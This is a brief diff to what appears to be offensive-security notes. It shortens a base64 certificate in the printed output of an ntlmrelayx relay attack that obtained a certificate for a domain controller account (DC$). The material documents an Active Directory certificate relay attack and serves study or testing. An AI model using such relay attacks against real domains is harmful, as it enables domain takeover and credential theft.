@@ -102,7 +102,7 @@ check back ntlmrelayx server
 	[*] Getting certificate...
 	[*] GOT CERTIFICATE!
 	[*] Base64 certificate of user DC$: 
-	MIIShQIBAzCCEk8GCSqGSIb3DQEHAaCCEkAEghI8MIISODCCCGcGCSqGSIb3DQEHBqCCCFgwgghUAgEAMIIITQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQI1bw80uoT1OECAggAgIIIIGPwCalx5il1r7k/....cCgQIixsKtYEYD3M=
+	MIIShQIBAzCCEk8GCSqGSIb3....CAggAgIIIIGPwCalx5il1r7k/....cCgQIixsKtYEYD3M=
 	[*] Skipping user DC$ since attack was already performed
 	[*] Skipping user DC$ since attack was already performed
 	[*] Skipping user DC$ since attack was already performed
